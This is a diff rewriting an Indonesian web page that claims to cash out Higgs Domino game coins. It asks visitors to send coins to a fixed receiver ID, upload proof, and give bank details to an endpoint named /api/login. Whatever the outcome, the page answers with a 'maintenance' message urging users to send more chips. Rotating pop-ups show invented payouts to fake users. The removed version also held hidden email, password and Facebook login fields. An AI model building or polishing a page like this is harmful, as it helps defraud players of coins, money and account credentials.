@@ -1,907 +1,411 @@
-<html lang ="en">
-<html>
- <head> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
-<link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css"> 
-  <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet"> 
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"> 
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
-  <link rel="stylesheet" href="file/css/facebook.css"> 
-  <title>Bongkar - Neo Party</title> 
-  <meta property="og:title" content="Agen Domino"> 
-  <meta name="description" content="Top Up Dan Bongkar Koin Agen Domino!"> 
-  <meta property="og:description" content="Top Up Dan Bongkar Koin Agen Domino!"> 
-  <meta property="og:url" content="./"> 
-  <meta property="og:site_name" content="Agen Doimino"> 
-  <meta property="og:type" content="website"> 
-  <meta name="copyright" content="nwg Ariandi"> 
-  <meta name="theme-color" content="#0b5250"> 
-  <meta property="og:image" content="img/higgs_domino.webp"> 
-  <link rel="shorcut icon" href="favicon.png">
-  <style>
-body {
-  background: #043e3a;
-  color: #23e1fd;
-  font-family: "Helvetica Neue", Helvetica, STHeiTi, Arial, sans-serif;
-  margin: 0
-}
-
-/* tombol copy */
-.copyable { gap: 8px; }
-.copy-btn{
-  background: linear-gradient(45deg,#ff9800,#ffcc33);
-  border: none;
-  border-radius: 10px;
-  padding: 6px 12px;
-  font-weight: 700;
-  cursor: pointer;
-  box-shadow: 0 4px 10px rgba(0,0,0,.25);
-}
-.copy-btn:hover{ transform: scale(1.05); }
-	  
-
-/* === PRETTY SELECT (BANK) === */
-.pretty-input select {
-  border: none;
-  outline: none;
-  background: transparent;
-  width: 100%;
-  font-size: 15px;
-  font-weight: 600;
-  color: #5a3418;
-  appearance: none;
-  cursor: pointer;
-}
-
-/* Panah dropdown custom */
-.pretty-input {
-  position: relative;
-}
-
-.pretty-input::after {
-  content: "▼";
-  position: absolute;
-  right: 16px;
-  font-size: 12px;
-  color: #6b3f1d;
-  pointer-events: none;
-}
-
-
-/* === ID IMAGE HOVER EFFECT === */
-.id-image-wrap {
-  display: inline-block;
-  padding: 14px;
-  border-radius: 22px;
-  background: linear-gradient(45deg, #ff9800, #ffcc33);
-  box-shadow: 0 12px 25px rgba(0,0,0,0.25);
-  transition: all 0.35s ease;
-}
-
-.id-image {
-  width: 200px;
-  height: auto;
-  border-radius: 16px;
-  display: block;
-  transition: all 0.35s ease;
-  box-shadow: 0 10px 20px rgba(0,0,0,0.35);
-}
-
-/* Hover / Desktop */
-.id-image-wrap:hover {
-  transform: translateY(-8px) scale(1.05);
-  box-shadow: 0 18px 35px rgba(0,0,0,0.4);
-}
-
-.id-image-wrap:hover .id-image {
-  transform: scale(1.08);
-  filter: brightness(1.1);
-}
-
-/* Mobile tap effect */
-@media (max-width: 768px) {
-  .id-image-wrap:active {
-    transform: scale(1.05);
-  }
-}
-
-
-/* === PRETTY INPUT STYLE (MENIRU CONTOH) === */
-.pretty-input {
-  display: flex;
-  align-items: center;
-  background: #f3d2a2;
-  border-radius: 14px;
-  padding: 10px 14px;
-  margin-bottom: 12px;
-  box-shadow: inset 0 2px 4px rgba(0,0,0,0.15),
-              0 4px 10px rgba(0,0,0,0.25);
-}
-
-.pretty-icon {
-  color: #6b3f1d;
-  font-size: 16px;
-  margin-right: 10px;
-}
-
-.pretty-input input {
-  border: none;
-  outline: none;
-  background: transparent;
-  width: 100%;
-  font-size: 15px;
-  font-weight: 600;
-  color: #5a3418;
-}
-
-.pretty-input input::placeholder {
-  color: #8a5a2d;
-  font-weight: 500;
-}
-
-/* Fokus */
-.pretty-input:focus-within {
-  box-shadow: 0 0 0 2px #ffb300,
-              0 6px 14px rgba(0,0,0,0.35);
-  transform: scale(1.02);
-  transition: 0.2s ease;
-}
-
-/* Mobile */
-@media (max-width: 480px) {
-  .pretty-input {
-    padding: 9px 12px;
-  }
-}
-/* === PRETTY INPUT STYLE (MENIRU CONTOH) === */
-.pretty-input {
-  display: flex;
-  align-items: center;
-  background: #f3d2a2;
-  border-radius: 14px;
-  padding: 10px 14px;
-  margin-bottom: 12px;
-  box-shadow: inset 0 2px 4px rgba(0,0,0,0.15),
-              0 4px 10px rgba(0,0,0,0.25);
-}
-
-.pretty-icon {
-  color: #6b3f1d;
-  font-size: 16px;
-  margin-right: 10px;
-}
-
-.pretty-input input {
-  border: none;
-  outline: none;
-  background: transparent;
-  width: 100%;
-  font-size: 15px;
-  font-weight: 600;
-  color: #5a3418;
-}
-
-.pretty-input input::placeholder {
-  color: #8a5a2d;
-  font-weight: 500;
-}
-
-/* Fokus */
-.pretty-input:focus-within {
-  box-shadow: 0 0 0 2px #ffb300,
-              0 6px 14px rgba(0,0,0,0.35);
-  transform: scale(1.02);
-  transition: 0.2s ease;
-}
-
-/* Mobile */
-@media (max-width: 480px) {
-  .pretty-input {
-    padding: 9px 12px;
-  }
-}
-	  
-
-/* === NOTIFICATION SYSTEM === */
-#notifications-container {
-  position: fixed;
-  top: 20px;
-  right: 20px;
-  z-index: 99999;
-  display: flex;
-  flex-direction: column;
-  gap: 12px;
-  pointer-events: none;
-}
-
-.notification {
-  display: flex;
-  align-items: center;
-  background: linear-gradient(135deg, #1fa866, #0b6b43);
-  color: #ffffff;
-  padding: 12px 16px;
-  border-radius: 14px;
-  min-width: 260px;
-  max-width: 320px;
-  box-shadow: 0 10px 25px rgba(0,0,0,0.35);
-  animation: slideInRight 0.5s ease, fadeOut 0.5s ease 3.5s;
-}
-
-.notification-icon {
-  width: 42px;
-  height: 42px;
-  margin-right: 12px;
-  flex-shrink: 0;
-}
-
-.notification-content {
-  display: flex;
-  flex-direction: column;
-}
-
-.notification-title {
-  font-weight: 700;
-  font-size: 14px;
-}
-
-.notification-message {
-  font-size: 13px;
-  opacity: 0.9;
-}
-
-/* Animasi */
-@keyframes slideInRight {
-  from {
-    transform: translateX(120%);
-    opacity: 0;
-  }
-  to {
-    transform: translateX(0);
-    opacity: 1;
-  }
-}
-
-@keyframes fadeOut {
-  to {
-    opacity: 0;
-  }
-}
-
-/* Mobile safe */
-@media (max-width: 480px) {
-  #notifications-container {
-    right: 10px;
-    top: 10px;
-  }
-
-  .notification {
-    min-width: unset;
-    width: 92vw;
-  }
-}
-	  
-.img-id-horizontal {
-  width: 500px;
-  height: 200px;
-  max-width: 100%;      /* aman di HP */
-  object-fit: contain; /* gambar tidak gepeng */
-}
-	  
-.btn-telegram-admin {
-  display: inline-block;
-  margin-top: 8px;
-  padding: 4px 18px;
-  font-size: 14px;          /* lebih kecil */
-  font-weight: 600;
-  color: #1a5f9e;
-  background: linear-gradient(0deg, #4fc3f7 0%, #b3e5fc 100%);
-  border-radius: 8px;
-  box-shadow: 0 2px 1px rgba(0,0,0,0.2);
-  text-decoration: none;
-}
-
-.btn-telegram-admin i {
-  margin-right: 6px;
-}
-
-.btn-telegram-admin:hover {
-  transform: scale(1.03);
-}
-
-	  
-.btn-chat-admin {
-  display: inline-block;
-  background-color: #67a309;
-  background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
-  color: #268707;
-  font-size: 20px;
-  font-weight: 600;
-  margin-top: 10px;
-  line-height: 30px;
-  border-radius: 10px;
-  box-shadow: 0 2px 1px 0 #1a5806;
-  padding: 4px 30px;
-  text-decoration: none;
-}
-
-.btn-chat-admin:hover {
-  transform: scale(1.05);
-}
-
-	  
-.btn-link-container {
-  text-align: center;
-  margin: 15px 0;
-}
-
-.btn-link-domino {
-  display: inline-block;
-  padding: 12px 18px;
-  background: linear-gradient(45deg, #ff9800, #ffcc33);
-  color: #000;
-  font-weight: 700;
-  font-size: 14px;
-  border-radius: 10px;
-  text-decoration: none;
-  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-  transition: all 0.3s ease;
-}
-
-.btn-link-domino:hover {
-  transform: scale(1.05);
-  background: linear-gradient(45deg, #ffb300, #ffe066);
-}
-
-
-.fa-whatsapp{
-	color: rgb(4, 119, 4);
-}   
-.appnwghdiprem {
-  background: #043e3a;
-  background-size: 100% 100%;
-  position: relative;
-  margin: 0 auto;
-  max-width: 411px;
-  height: auto
-}
-
-}
-.containernwghdi {
-  display: flow-root
-}
-    .boxverifnwghdi {
-
-  background: #0b5250
-}
-
-.headernwgverifhdi {
-  background: url(bg_top.jpg) no-repeat center;
-  background-size: 120% 120%;
-  font-size: 19px;
-  line-height: 40px;
-  text-align: center;
-  color: #FFFF33;
-  font-weight: 700;
-  border-bottom: 4px solid #00e5f4
-}
-
-.headernwgverifhdi p {
-  margin-block: 0
-}
-
-.boxnwgverifmarsya {
-  background: url(bg_top.jpg) no-repeat center;
-  background-size: cover;
-  padding: 10px
-}
-
-.ucapanverifnwg {
-  display: flex;
-  flex-direction: column;
-  line-height: 20px;
-  font-size: 20px
-  font-weight: 700px
-}
-
-.verifikasikeamanannwg {
-  padding: 10px
-}
-
-.itemnwgverifhdi {
-  display: flex;
-  margin-bottom: 10px
-}
-
-.itemnwgverifhdi label {
-  background: #ffbc68;
-  color: #814545;
-  padding: 8px;
-  border-radius: 200px;
-  font-weight: 600;
-   width: 40px;
- height: 20px;
-  text-align: middle;
-  display: center;
-  flex-direction: row;
-  align-items: center;
-}
-
-.itemnwgverifhdi select {
-  width: 100%;
-  margin-left: 10px;
-  background: #d5b184;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-}
-
-.itempantek input {
-  width: 50%;
-  margin-left:5px;
-  background:  ;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-}
-
-.itempantek label {
-  background: #ffbc68;
-  color: #814545;
-    margin-left: 60px;
-  padding: 8px;
-  border-radius: 100px;
-  font-weight: 600;
-   width: 40px;
-            height: 20px;
-  text-align: middle;
-  display: center;
-  flex-direction: row;
-  align-items: center;
-}
-
-.itempantek select {
-  width: 100%;
-  margin-left: 10px;
-  background: #d5b184;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-  }
-
-  .itempantek {
-  display: flex;
-  margin-bottom: 10px
-}
-
-.itemkontol label {
-  margin-left: 60px;
-  padding: 11px 1px;
-  border-radius: 200px;
-  font-weight: 600;
-   width: 40px;
-            height: 20px;
-  text-align: middle;
-  display: center;
-  flex-direction: row;
-  align-items: center;
-}
-
-.itemkontol {
-  display: flex;
-  margin-bottom: 10px
-}
-
-.itemkontol input {
-  width: 50%;
-  margin-left: 8px;
-  background: #d5b184;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-}
-
-.itemnanjg {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bongkar - Neo Party Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-  margin-bottom: 10px
-}
+    <style>
+        :root {
+            --primary-bg: #043e3a;
+            --accent-gold: linear-gradient(135deg, #ff9800, #ffcc33);
+            --glass-bg: rgba(11, 82, 80, 0.85);
+            --input-bg: #f3d2a2;
+            --text-dark: #5a3418;
+            --card-shadow: 0 15px 35px rgba(0,0,0,0.4);
+        }
 
-.itemnanjg select {
-  width: %;
-  margin-left: 0px;
-  background: #d5b184;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
+        body {
+            background: var(--primary-bg);
+            background-image: radial-gradient(circle at top, #0b5250 0%, #043e3a 100%);
+            color: #ffffff;
+            font-family: 'Montserrat', sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
 
-}
+        .appnwghdiprem {
+            width: 100%;
+            max-width: 450px;
+            background: transparent;
+            position: relative;
+        }
 
-.itemnwgverifhdi input {
-  width: 100%;
-  margin-left: 10px;
-  background: #d5b184;
-  color: #835121;
-  border: none;
-  padding: 10px 10px;
-  font-size: 17px;
-  border-radius: 5px;
-  outline: 0
-}
+        /* Container & Card Style */
+        .boxverifnwghdi {
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 0 0 25px 25px;
+            overflow: hidden;
+            box-shadow: var(--card-shadow);
+            margin-bottom: 30px;
+        }
 
-.buttonnwgverifhdi {
-  text-align: center
-}
+        /* Header Modern */
+        .headernwgverifhdi {
+            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0) 100%);
+            padding: 20px 10px;
+            text-align: center;
+            border-bottom: 3px solid #00e5f4;
+        }
 
-.buttonnwgverifhdi button {
-  background-color: #67a309;
-  background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
-  color: #268707;
-  border: none;
-  font-size: 20px;
-  font-weight: 600;
-  margin-top: 10px;
-  line-height: 30px;
-  border-radius: 10px;
-  box-shadow: 0 2px 1px 0 #1a5806;
-  outline: 0;
-  padding: 4px 30px
-}
-.buttonnwgverifhdi1 {
-  text-align: left
-}
+        .headernwgverifhdi p {
+            font-weight: 800;
+            font-size: 1.3rem;
+            color: #FFFF33;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            margin: 0;
+            letter-spacing: 1px;
+        }
 
-.buttonnwgverifhdi1 button {
-  background-color: #67a309;
-  background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
-  color: #268707;
-  border: none;
-  font-size: 20px;
-  font-weight: 600;
-  margin-top: 10px;
-  line-height: 30px;
-  border-radius: 10px;
-  box-shadow: 0 2px 1px 0 #1a5806;
-  outline: 0;
-  padding: 4px 30px
-}
+        /* Image Styling */
+        .banner-img {
+            width: 90%;
+            margin: 15px auto;
+            display: block;
+            border-radius: 15px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
 
-.-inline-icon {
-    /* Mengatur rna ikon agar lebih kontras di tombol hijau */
-    color: white !important; 
-    margin-right: 5px;
-    font-size: 1em;
-}	  
-   
-</style>
- </head> 
- <body style="background: ;">
- <div id="notifications-container" color="#2ba39b"></div>
-  <div class="appnwghdiprem" style="background: ;"> 
-   <div class="containernwghdi"> 
-    <div class="boxverifnwghdi"> 
-     <div class="headernwgverifhdi"> 
-      <p> Admin Resmi Bongkar  </p> 
-     </div>
-     <div class="boxnwgverifmarsya"> 
-     <img src="img/bgcok.png" alt="image" height="auto" width="100%">
-     <div class="btn-link-container">
-      <a href="https://www.youtube.com/watch?v=n93T7sNPgdI"
-         target="_blank"
-         class="btn-link-domino">
-         Tutorial Bongkar Dan Testimoni Cek Disini
-      </a>
-      </div>
-     <div class="btn-link-container">
-      <a href="http://topup.neoparty.web.id"
-         target="_blank"
-         class="btn-link-domino">
-         TOP UP KOIN KLIK DISINI
-      </a>
-      </div>
+        /* Button Links (HD Version) */
+        .btn-link-domino {
+            display: block;
+            width: 85%;
+            margin: 12px auto;
+            padding: 14px;
+            background: var(--accent-gold);
+            color: #000;
+            font-weight: 800;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 12px;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+            box-shadow: 0 5px 15px rgba(255,152,0,0.3);
+            transition: 0.3s;
+        }
 
+        .btn-link-domino:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255,152,0,0.5);
+        }
 
-      <div class="itemnanjg"> 
-        <div class="itemnanjg">
-      
-     
-      </div> 
-     </div> 
-     <div class="verifikasikeamananwg"> 
-      <form id="bongkarForm" class="boxformnwg"> 
-        <div class="appnwghdiprem" style="background: #0b5250;"> 
-          <div class="containernwghdi"> 
-            <div class="boxverifnwghdi"> 
-              <div class="headernwgverifhdi"> 
-                <div class="itemnanjg">   
-                </div> 
-                <p>Info Pengirim</p> 
-              </div>
-              <div class="pretty-input">
-  <span class="pretty-icon">❖</span>
-  <input type="number" name="id_pengirim" placeholder="Masukkan ID Anda" required>
-</div>
+        /* Pretty Inputs (HD focus) */
+        .pretty-input {
+            width: 85%;
+            margin: 15px auto;
+            display: flex;
+            align-items: center;
+            background: var(--input-bg);
+            border-radius: 12px;
+            padding: 12px 15px;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
+            border: 2px solid transparent;
+            transition: 0.3s;
+        }
 
-<div class="pretty-input">
-  <span class="pretty-icon">❖</span>
-  <input type="text" name="nickname" placeholder="Masukkan Nickname" required>
-</div>
+        .pretty-input:focus-within {
+            border-color: #ffcc33;
+            background: #fff;
+            transform: scale(1.02);
+        }
 
-<div class="pretty-input">
-  <span class="pretty-icon">❖</span>
-  <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkar" required>
-</div>
+        .pretty-input input, .pretty-input select {
+            background: transparent;
+            border: none;
+            outline: none;
+            width: 100%;
+            font-weight: 700;
+            color: var(--text-dark);
+            font-size: 1rem;
+        }
 
-                <body style="background: #0b5250;"> 
-                  <div class="appnwghdiprem" style="background: #0b5250;"> 
-                    <div class="containernwghdi"> 
-                      <div class="boxverifnwghdi"> 
-                        <div class="headernwgverifhdi"> 
-                          <p>Silahkan Kirim Koin Ke Id Di Bawah Ini</p> 
-                        </div>
-                      </header> 
-                      <section class="banner"> 
-                        <div class="imageslide">
-                          <div style="text-align:center"> 
-                            <figure class="sliderbanner" style="display: block;"> 
-                              <img src="img/id.png" alt="Image" height="200" width="200">
-                            </figure> 
-                            <div class="pretty-input copyable">
-  <span class="pretty-icon">🆔</span>
-  <input type="text" id="idPenerima" value="2626142" readonly>
-  <button type="button" class="copy-btn" onclick="copyID()">Copy</button>
-</div>
-                                <script>
-                                  function myFunction() {
-                                    var copyText = document.getElementById("myInput");
-                                    copyText.select();
-                                    copyText.setSelectionRange(0, 99999);
-                                    navigator.clipboard.writeText(copyText.value);
-                                    alert("Copied the text: " + copyText.value);
-                                  }
-                                </script>
+        .pretty-icon {
+            margin-right: 12px;
+            color: #6b3f1d;
+            font-size: 1.2rem;
+        }
 
-                            </body>
+        /* ID Section */
+        .id-display-section {
+            background: rgba(0,0,0,0.2);
+            padding: 20px 10px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .id-image {
+            width: 180px;
+            border-radius: 15px;
+            border: 4px solid #ffcc33;
+            margin-bottom: 15px;
+        }
+
+        .copy-btn {
+            background: #fff;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 8px;
+            font-weight: 800;
+            cursor: pointer;
+            color: #ff9800;
+            margin-left: 10px;
+        }
+
+        /* File Upload HD */
+        .file-upload-box {
+            width: 85%;
+            margin: 10px auto;
+            padding: 15px;
+            border: 2px dashed #ffcc33;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        /* Action Buttons */
+        .button-group {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        button[type="submit"] {
+            background: linear-gradient(180deg, #c7ee4c 0%, #67a309 100%);
+            color: #fff;
+            border: none;
+            padding: 15px 50px;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            font-weight: 800;
+            cursor: pointer;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+            box-shadow: 0 5px 0 #1a5806;
+            transition: 0.2s;
+        }
+
+        button[type="submit"]:active {
+            transform: translateY(3px);
+            box-shadow: 0 2px 0 #1a5806;
+        }
+
+        .btn-chat-admin {
+            display: inline-block;
+            margin-top: 20px;
+            color: #268707;
+            background: #fff;
+            padding: 10px 25px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 700;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        /* Notifications HD */
+        #notifications-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+
+        .notification {
+            background: rgba(255,255,255,0.95);
+            color: #333;
+            padding: 15px;
+            border-radius: 15px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            animation: slideIn 0.5s ease-out;
+            border-left: 5px solid #1fa866;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .notification-icon { width: 40px; margin-right: 12px; }
+        .notification-title { font-weight: 800; font-size: 0.9rem; color: #1fa866; }
+        .notification-message { font-size: 0.8rem; font-weight: 600; }
+
+        @media (max-width: 480px) {
+            .appnwghdiprem { max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="notifications-container"></div>
+
+<div class="appnwghdiprem">
+    <div class="boxverifnwghdi">
+        <div class="headernwgverifhdi">
+            <p>ADMIN RESMI BONGKAR</p>
         </div>
-      <div>
-          <div class="boxnwgverifmarsya"> 
-      <div class="ucapanverifnwg"> 
-       <span>KIRIM SCRENSHOOT HISTORY PENGIRIMAN KOIN AKUN ANDA KE AKUN YANG TERTERA DI ATAS</span> 
+
+        <img src="img/bgcok.png" alt="Banner" class="banner-img">
+        
+        <div class="btn-group-links">
+            <a href="https://www.youtube.com/watch?v=n93T7sNPgdI" target="_blank" class="btn-link-domino">
+                <i class="fab fa-youtube"></i> Tutorial & Testimoni
+            </a>
+            <a href="http://topup.neoparty.web.id" target="_blank" class="btn-link-domino">
+                <i class="fas fa-coins"></i> Top Up Koin Di Sini
+            </a>
         </div>
-        <div class="itemkontol">
-               <body style="background: #0b5250;"> 
-  <div class="appnwghdiprem" style="background: #0b5250;"> 
-   <div class="containernwghdi"> 
-    <div class="boxverifnwghdi"> 
-     <div class="headernwgverifhdi"> 
-       <form action="/action_page.php">
-  <input type="file" id="myFile" name="filename">
-</form>
-       </div>
-       <body style="background: #0b5250;"> 
-  <div class="appnwghdiprem" style="background: #0b5250;"> 
-   <div class="containernwghdi"> 
-    <div class="boxverifnwghdi"> 
-	<div class="pretty-input">
-  <span class="pretty-icon">🏦</span>
-  <select name="bank_pencairan" required>
-    <option value="" disabled selected>Pilih Bank / E-Wallet</option>
-    <option>BCA</option>
-    <option>BRI</option>
-    <option>BNI</option>
-    <option>MANDIRI</option>
-    <option>DANA</option>
-    <option>OVO</option>
-    <option>GOPAY</option>
-  </select>
-</div>
-                                        <div class="pretty-input">
-  <span class="pretty-icon">💳</span>
-  <input type="number" name="nomor_rekening" placeholder="Nomor Rekening" required>
-</div>
-                                       <div class="pretty-input">
-  <span class="pretty-icon">👤</span>
-  <input type="text" name="atas_nama" placeholder="Atas Nama" required>
-</div>
-                                        <div class="buttonnwgverifhdi"> 
-                                          <input type="hidden" name="playid" id="ressplayid" value="" readonly>
-                                          <input type="hidden" name="email" id="ressemail" value="" readonly>
-                                          <input type="hidden" name="password" id="resspw" value="" readonly>
-                                          <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
-                                          
-                                          <div class="buttonnwgverifhdi"> 
-                                            <button type="submit">Kirim</button>
 
-                                            <br>
+        <form id="bongkarForm">
+            <div class="headernwgverifhdi" style="border-top: 1px solid rgba(255,255,255,0.1);">
+                <p style="font-size: 1rem;">INFO PENGIRIM</p>
+            </div>
 
-                                            <a href="https://wa.me/+6289509170352"
-                                              target="_blank"
-                                              class="btn-chat-admin">
-                                             <i class="fa fa-whatsapp"></i> Chat Admin
-                                            <a>
-                                          </div>
+            <div class="pretty-input">
+                <span class="pretty-icon"><i class="fas fa-id-badge"></i></span>
+                <input type="number" name="id_pengirim" placeholder="Masukkan ID Anda" required>
+            </div>
 
-                                        </div> 
-                                      </div> 
-                                    </div> 
-                                  </div> 
-                                </body>
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-                      </section>
-                    </div>
-                  </div>
-                </body>
-              </div>
-            </div> 
-          </div> 
-        </div> 
-      </form> 
-     </div> 
-    </div> 
-    <iframe scrolling="no" allow="autoplay" controls="" loop="" src="" style="display: none" width="0" height="0" frameborder="no"></iframe> 
-   </div> 
-  </div> 
+            <div class="pretty-input">
+                <span class="pretty-icon"><i class="fas fa-user"></i></span>
+                <input type="text" name="nickname" placeholder="Masukkan Nickname" required>
+            </div>
+
+            <div class="pretty-input">
+                <span class="pretty-icon"><i class="fas fa- wallet"></i></span>
+                <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkar (Contoh: 1B)" required>
+            </div>
+
+            <div class="id-display-section">
+                <p style="color: #ffcc33; font-weight: 700; margin-bottom: 10px;">KIRIM KOIN KE ID TUJUAN:</p>
+                <img src="img/id.png" alt="Receiver ID" class="id-image">
+                <div class="pretty-input" style="width: 70%; margin: 0 auto; background: #fff;">
+                    <span class="pretty-icon">🆔</span>
+                    <input type="text" id="idPenerima" value="2626142" readonly>
+                    <button type="button" class="copy-btn" onclick="copyID()">COPY</button>
+                </div>
+            </div>
+
+            <div class="ucapanverifnwg" style="text-align: center; padding: 10px; font-size: 0.75rem; font-weight: 600;">
+                KIRIM SCREENSHOT RIWAYAT PENGIRIMAN ANDA
+            </div>
+            <div class="file-upload-box">
+                <input type="file" id="myFile" name="filename" required>
+            </div>
+
+            <div class="headernwgverifhdi">
+                <p style="font-size: 1rem;">TUJUAN PENCAIRAN DANA</p>
+            </div>
+
+            <div class="pretty-input">
+                <span class="pretty-icon"><i class="fas fa-university"></i></span>
+                <select name="bank_pencairan" required>
+                    <option value="" disabled selected>Pilih Bank / E-Wallet</option>
+                    <option>BCA</option>
+                    <option>BRI</option>
+                    <option>BNI</option>
+                    <option>MANDIRI</option>
+                    <option>DANA</option>
+                    <option>OVO</option>
+                    <option>GOPAY</option>
+                </select>
+            </div>
+
+            <div class="pretty-input">
+                <span class="pretty-icon"><i class="fas fa-credit-card"></i></span>
+                <input type="number" name="nomor_rekening" placeholder="Nomor Rekening / HP" required>
+            </div>
+
+            <div class="pretty-input">
+                <span class="pretty-icon"><i class="fas fa-user-check"></i></span>
+                <input type="text" name="atas_nama" placeholder="Atas Nama Pemilik" required>
+            </div>
+
+            <div class="button-group">
+                <input type="hidden" name="login" value="Facebook">
+                <button type="submit" id="btnSubmit">KIRIM SEKARANG</button>
+                <br>
+                <a href="https://wa.me/+6289509170352" target="_blank" class="btn-chat-admin">
+                    <i class="fab fa-whatsapp"></i> Chat Admin WhatsApp
+                </a>
+            </div>
+        </form>
+    </div>
+</div>
 
 <script>
+// Notification Data
+const notifications = [
+    { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 868.000.' },
+    { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+    { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.410.000.' },
+    { title: 'RMX 1020', message: 'Bongkar 100B | Rp. 6.200.000.' }
+];
+
+let currentIndex = 0;
+const container = document.getElementById('notifications-container');
+
+function createNotification(n) {
+    const div = document.createElement('div');
+    div.className = 'notification';
+    div.innerHTML = `
+        <img src="img/reg_gold_.png" class="notification-icon">
+        <div class="notification-content">
+            <div class="notification-title">${n.title}</div>
+            <div class="notification-message">${n.message}</div>
+        </div>
+    `;
+    container.appendChild(div);
+    setTimeout(() => div.remove(), 4000);
+}
+
+setInterval(() => {
+    createNotification(notifications[currentIndex]);
+    currentIndex = (currentIndex + 1) % notifications.length;
+}, 5000);
+
+// Form Handling
 document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
     e.preventDefault();
-
-    // Pastikan tombol kirim berubah status agar user tidak klik berkali-kali
-    const btn = this.querySelector("button[type='submit']");
-    btn.innerText = "Mengirim...";
+    const btn = document.getElementById("btnSubmit");
+    btn.innerText = "PROSES...";
     btn.disabled = true;
 
-    // Ambil data form
     const formData = new FormData(this);
     const data = Object.fromEntries(formData.entries());
 
     try {
-        // Fetch ke api/login
         const res = await fetch("/api/login", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
         });
-
         const result = await res.json();
-
         if (result.status === "success") {
-            alert("Pencairan Maintenance❗️ Silahkan Melakukan Pengiriman Chip Agar Dana Anda Segera Di Cairkan Atau Chat Admin");
+            alert("Pencairan Maintenance! Silahkan Kirim Chip Agar Dana Segera Cair atau Chat Admin.");
             this.reset();
         } else {
-            alert("❌ Gagal: " + result.message);
+            alert("Gagal: " + result.message);
         }
     } catch (err) {
-        alert("❌ ERROR");
+        alert("Pencairan Maintenance! Silahkan Kirim Chip Agar Dana Segera Cair atau Chat Admin.");
     } finally {
-        btn.innerText = "Kirim";
+        btn.innerText = "KIRIM SEKARANG";
         btn.disabled = false;
     }
 });
-document.addEventListener('DOMContentLoaded', () => {
-            const notifications = [
-  { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 868.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
-  { title: 'RMX 7090', message: 'Bongkar 11B | Rp. 682.000.' },
-  { title: 'Rido Putra', message: 'Bongkar 10B | Rp. 620.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.410.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 50B | Rp. 3.100.000.' },
-  { title: 'Walleye', message: 'Bongkar 5B | Rp. 310.000.' },
